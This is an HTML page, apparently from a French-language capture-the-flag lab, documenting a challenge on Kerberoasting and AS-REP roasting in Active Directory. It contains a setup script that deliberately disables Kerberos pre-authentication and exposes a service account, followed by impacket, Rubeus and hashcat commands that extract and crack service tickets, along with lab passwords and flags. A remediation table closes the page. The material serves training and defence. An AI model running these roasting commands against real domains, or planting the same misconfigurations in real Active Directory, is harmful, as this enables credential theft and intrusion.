@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Flag 7b — Kerberoasting et AS-REP Roasting - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Flag 7b \u2014 Kerberoasting et AS-REP Roasting";
+        var mkdocs_page_input_path = "windows/Flag7b-Kerberos.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Crypto</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Flag 7b — Kerberoasting et AS-REP Roasting</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="flag-7b-kerberoasting-et-as-rep-roasting">Flag 7b — Kerberoasting et AS-REP Roasting</h1>
+<blockquote>
+<p><strong>Technique :</strong> Kerberos Ticket Extraction + Offline Cracking
+<strong>Machine de déploiement :</strong> DC01
+<strong>Machine d'exploitation :</strong> Machine attaquante Linux (Kali/Parrot) ou WS01 avec RSAT
+<strong>Compte de départ :</strong> <code>CTF\lowpriv</code> / <code>User@1234</code>
+<strong>Difficulté :</strong> Intermédiaire / Avancé</p>
+</blockquote>
+<hr />
+<h2 id="deploiement">Déploiement</h2>
+<h3 id="script-flag7b-kerberosps1">Script — Flag7b-Kerberos.ps1</h3>
+<blockquote>
+<p>[!warning] Lancer en PowerShell Admin sur DC01</p>
+</blockquote>
+<pre><code class="language-powershell">#Requires -RunAsAdministrator
+Import-Module ActiveDirectory
+
+$DomainDN = &quot;DC=ctf,DC=local&quot;
+
+Write-Host &quot;`n[FLAG 7b] Kerberoasting + AS-REP Roasting&quot; -ForegroundColor Cyan
+
+# --- 1. SPN sur svc-web (cible Kerberoasting) ---
+$spns = (Get-ADUser -Identity &quot;svc-web&quot; -Properties ServicePrincipalNames).ServicePrincipalNames
+if (&quot;HTTP/intranet.ctf.local&quot; -notin $spns) {
+    Set-ADUser -Identity &quot;svc-web&quot; -ServicePrincipalNames @{
+        Add = &quot;HTTP/intranet.ctf.local&quot;,&quot;HTTP/intranet&quot;
+    }
+    Write-Host &quot;  [+] SPN enregistre : HTTP/intranet.ctf.local -&gt; svc-web&quot; -ForegroundColor Green
+} else {
+    Write-Host &quot;  [~] SPN deja present sur svc-web&quot; -ForegroundColor Gray
+}
+
+# --- 2. Desactiver la pre-auth sur svc-legacy (cible AS-REP Roasting) ---
+Set-ADAccountControl -Identity &quot;svc-legacy&quot; -DoesNotRequirePreAuth $true
+Write-Host &quot;  [+] Pre-auth Kerberos desactivee sur svc-legacy&quot; -ForegroundColor Green
+
+# --- 3. Share WebAdmin -&gt; flag apres Kerberoasting ---
+$webPath = &quot;C:\Shares\WebAdmin&quot;
+New-Item -ItemType Directory -Path $webPath -Force | Out-Null
+
+if (Get-SmbShare -Name &quot;WebAdmin&quot; -ErrorAction SilentlyContinue) {
+    Remove-SmbShare -Name &quot;WebAdmin&quot; -Force
+}
+New-SmbShare -Name &quot;WebAdmin&quot; -Path $webPath | Out-Null
+
+$aclW = Get-Acl $webPath
+$aclW.SetAccessRuleProtection($true, $false)
+$aclW.Access | ForEach-Object { $aclW.RemoveAccessRule($_) | Out-Null }
+foreach ($sid in @(&quot;S-1-5-18&quot;, &quot;S-1-5-32-544&quot;)) {
+    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
+    $aclW.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+        $s, &quot;FullControl&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+}
+$aclW.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+    &quot;CTF\svc-web&quot;, &quot;FullControl&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+Set-Acl -Path $webPath -AclObject $aclW
+Set-Content &quot;$webPath\flag7b-kerb.txt&quot; -Value &quot;FLAG{kerberoasting_svc_account_cracked}&quot; -Encoding UTF8
+Write-Host &quot;  [+] Share \\DC01\WebAdmin cree (acces : svc-web)&quot; -ForegroundColor Green
+
+# --- 4. Share LegacyAdmin -&gt; flag apres AS-REP Roasting ---
+$legPath = &quot;C:\Shares\LegacyAdmin&quot;
+New-Item -ItemType Directory -Path $legPath -Force | Out-Null
+
+if (Get-SmbShare -Name &quot;LegacyAdmin&quot; -ErrorAction SilentlyContinue) {
+    Remove-SmbShare -Name &quot;LegacyAdmin&quot; -Force
+}
+New-SmbShare -Name &quot;LegacyAdmin&quot; -Path $legPath | Out-Null
+
+$aclL = Get-Acl $legPath
+$aclL.SetAccessRuleProtection($true, $false)
+$aclL.Access | ForEach-Object { $aclL.RemoveAccessRule($_) | Out-Null }
+foreach ($sid in @(&quot;S-1-5-18&quot;, &quot;S-1-5-32-544&quot;)) {
+    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
+    $aclL.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+        $s, &quot;FullControl&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+}
+$aclL.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+    &quot;CTF\svc-legacy&quot;, &quot;FullControl&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+Set-Acl -Path $legPath -AclObject $aclL
+Set-Content &quot;$legPath\flag7b-asrep.txt&quot; -Value &quot;FLAG{asrep_roasting_no_preauth}&quot; -Encoding UTF8
+Write-Host &quot;  [+] Share \\DC01\LegacyAdmin cree (acces : svc-legacy)&quot; -ForegroundColor Green
+
+# --- 5. Verifications ---
+Write-Host &quot;`n  [*] SPN svc-web :&quot; -ForegroundColor Yellow
+Get-ADUser -Identity &quot;svc-web&quot; -Properties ServicePrincipalNames |
+    Select-Object -ExpandProperty ServicePrincipalNames
+
+Write-Host &quot;`n  [*] Pre-auth svc-legacy :&quot; -ForegroundColor Yellow
+Get-ADUser -Identity &quot;svc-legacy&quot; -Properties DoesNotRequirePreAuth |
+    Select-Object SamAccountName, DoesNotRequirePreAuth
+
+Write-Host &quot;`n  [*] Flags :&quot; -ForegroundColor Yellow
+Get-Content &quot;$webPath\flag7b-kerb.txt&quot;
+Get-Content &quot;$legPath\flag7b-asrep.txt&quot;
+
+Write-Host &quot;`n[FLAG 7b] DONE&quot; -ForegroundColor Green
+Write-Host &quot;  SNAPSHOT : DC01 - Flag7b deploye&quot; -ForegroundColor Yellow
+</code></pre>
+<hr />
+<h3 id="verification-du-deploiement">Vérification du déploiement</h3>
+<blockquote>
+<p>[!warning] Depuis PowerShell Admin sur DC01</p>
+</blockquote>
+<pre><code class="language-powershell"># Verifier le SPN
+Get-ADUser -Identity &quot;svc-web&quot; -Properties ServicePrincipalNames |
+    Select-Object -ExpandProperty ServicePrincipalNames
+# Attendu : HTTP/intranet.ctf.local
+
+# Verifier AS-REP
+Get-ADUser -Identity &quot;svc-legacy&quot; -Properties DoesNotRequirePreAuth |
+    Select-Object DoesNotRequirePreAuth
+# Attendu : True
+
+# Verifier les shares
+Get-SmbShare | Where-Object { $_.Name -match &quot;WebAdmin|LegacyAdmin&quot; } | Select-Object Name, Path
+</code></pre>
+<blockquote>
+<p>[!success] Snapshot DC01
+<strong><code>DC01 — Flag7b déployé</code></strong></p>
+</blockquote>
+<hr />
+<h2 id="write-up-kerberoasting">Write-up — Kerberoasting</h2>
+<h3 id="contexte">Contexte</h3>
+<p>Kerberoasting consiste à demander un ticket de service Kerberos (TGS) pour un compte ayant un SPN enregistré, puis à le cracker hors ligne. Tout utilisateur du domaine peut demander un TGS pour n'importe quel SPN. Le ticket est chiffré avec le hash NT du compte de service, ce qui permet de retrouver le mot de passe sans interaction supplémentaire avec le DC.</p>
+<hr />
+<h3 id="reconnaissance">Reconnaissance</h3>
+<h4 id="etape-1-lister-les-comptes-avec-spn">Étape 1 — Lister les comptes avec SPN</h4>
+<p>Connecté en <code>CTF\lowpriv</code> sur WS01 :</p>
+<pre><code class="language-powershell">Get-ADUser -Filter { ServicePrincipalNames -ne &quot;$null&quot; } `
+    -Properties ServicePrincipalNames |
+    Select-Object SamAccountName, ServicePrincipalNames
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>SamAccountName  ServicePrincipalNames
+--------------  ---------------------
+svc-web         {HTTP/intranet.ctf.local, HTTP/intranet}
+</code></pre>
+<p>Depuis Linux :</p>
+<pre><code class="language-bash">impacket-GetUserSPNs ctf.local/lowpriv:User@1234 -dc-ip 192.168.10.10
+</code></pre>
+<hr />
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="etape-2-extraire-le-ticket-tgs">Étape 2 — Extraire le ticket TGS</h4>
+<p>Depuis Linux :</p>
+<pre><code class="language-bash">impacket-GetUserSPNs ctf.local/lowpriv:User@1234 -dc-ip 192.168.10.10 \
+    -request -outputfile kerb_hashes.txt
+cat kerb_hashes.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>$krb5tgs$23$*svc-web$CTF.LOCAL$HTTP/intranet.ctf.local*$AABBCC...
+</code></pre>
+<p>Depuis Windows avec Rubeus :</p>
+<pre><code class="language-powershell">.\Rubeus.exe kerberoast /output:kerb_hashes.txt
+</code></pre>
+<h4 id="etape-3-cracker-le-hash-hors-ligne">Étape 3 — Cracker le hash hors ligne</h4>
+<pre><code class="language-bash">hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>$krb5tgs$23$*svc-web*...: Svc!Web2024
+</code></pre>
+<h4 id="etape-4-acceder-au-share-avec-les-credentials-crackes">Étape 4 — Accéder au share avec les credentials crackés</h4>
+<pre><code class="language-powershell">net use W: \\DC01\WebAdmin /user:CTF\svc-web Svc!Web2024
+Get-Content W:\flag7b-kerb.txt
+net use W: /delete
+</code></pre>
+<hr />
+<h3 id="recuperation-du-flag-kerberoasting">Récupération du flag — Kerberoasting</h3>
+<pre><code>FLAG{kerberoasting_svc_account_cracked}
+</code></pre>
+<hr />
+<h2 id="write-up-as-rep-roasting">Write-up — AS-REP Roasting</h2>
+<h3 id="contexte_1">Contexte</h3>
+<p>AS-REP Roasting cible les comptes pour lesquels la pré-authentification Kerberos est désactivée. Sans cette protection, n'importe qui peut demander un AS-REP chiffré avec le hash du compte sans s'authentifier au préalable. Le hash peut ensuite être cracké hors ligne.</p>
+<hr />
+<h3 id="reconnaissance_1">Reconnaissance</h3>
+<h4 id="etape-1-identifier-les-comptes-sans-pre-auth">Étape 1 — Identifier les comptes sans pré-auth</h4>
+<pre><code class="language-powershell">Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } `
+    -Properties DoesNotRequirePreAuth |
+    Select-Object SamAccountName
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>SamAccountName
+--------------
+svc-legacy
+</code></pre>
+<hr />
+<h3 id="exploitation_1">Exploitation</h3>
+<h4 id="etape-2-extraire-le-hash-as-rep">Étape 2 — Extraire le hash AS-REP</h4>
+<p>Depuis Linux :</p>
+<pre><code class="language-bash">impacket-GetNPUsers ctf.local/lowpriv:User@1234 -dc-ip 192.168.10.10 -request
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>$krb5asrep$23$svc-legacy@CTF.LOCAL:AABBCC...
+</code></pre>
+<h4 id="etape-3-cracker-le-hash">Étape 3 — Cracker le hash</h4>
+<pre><code class="language-bash">hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>$krb5asrep$23$svc-legacy...: Legacy123
+</code></pre>
+<h4 id="etape-4-acceder-au-share">Étape 4 — Accéder au share</h4>
+<pre><code class="language-powershell">net use L: \\DC01\LegacyAdmin /user:CTF\svc-legacy Legacy123
+Get-Content L:\flag7b-asrep.txt
+net use L: /delete
+</code></pre>
+<hr />
+<h3 id="recuperation-du-flag-as-rep-roasting">Récupération du flag — AS-REP Roasting</h3>
+<pre><code>FLAG{asrep_roasting_no_preauth}
+</code></pre>
+<hr />
+<h3 id="remediation">Remédiation</h3>
+<table>
+<thead>
+<tr>
+<th>Problème</th>
+<th>Correction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SPN sur compte avec mot de passe faible</td>
+<td>Utiliser des gMSA (Group Managed Service Accounts) avec mots de passe 120 caractères auto-générés</td>
+</tr>
+<tr>
+<td>Pré-auth Kerberos désactivée</td>
+<td>Réactiver sur tous les comptes sauf contrainte de compatibilité documentée</td>
+</tr>
+<tr>
+<td>Mot de passe de service dans rockyou</td>
+<td>Politique : mots de passe de service ≥ 25 caractères aléatoires</td>
+</tr>
+<tr>
+<td>Pas de détection</td>
+<td>Alerter sur les demandes massives de TGS ou AS-REP sans authentification</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="resume-de-la-chaine-dexploitation">Résumé de la chaîne d'exploitation</h3>
+<pre><code>lowpriv
+  ├─→ KERBEROASTING
+  │     └─→ Get-ADUser → svc-web a SPN HTTP/intranet.ctf.local
+  │           └─→ GetUserSPNs → TGS chiffré avec hash NT de svc-web
+  │                 └─→ hashcat -m 13100 → Svc!Web2024
+  │                       └─→ net use \\DC01\WebAdmin → FLAG{kerberoasting_svc_account_cracked}
+  │
+  └─→ AS-REP ROASTING
+        └─→ Get-ADUser DoesNotRequirePreAuth → svc-legacy
+              └─→ GetNPUsers → AS-REP chiffré sans authentification
+                    └─→ hashcat -m 18200 → Legacy123
+                          └─→ net use \\DC01\LegacyAdmin → FLAG{asrep_roasting_no_preauth}
+</code></pre>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
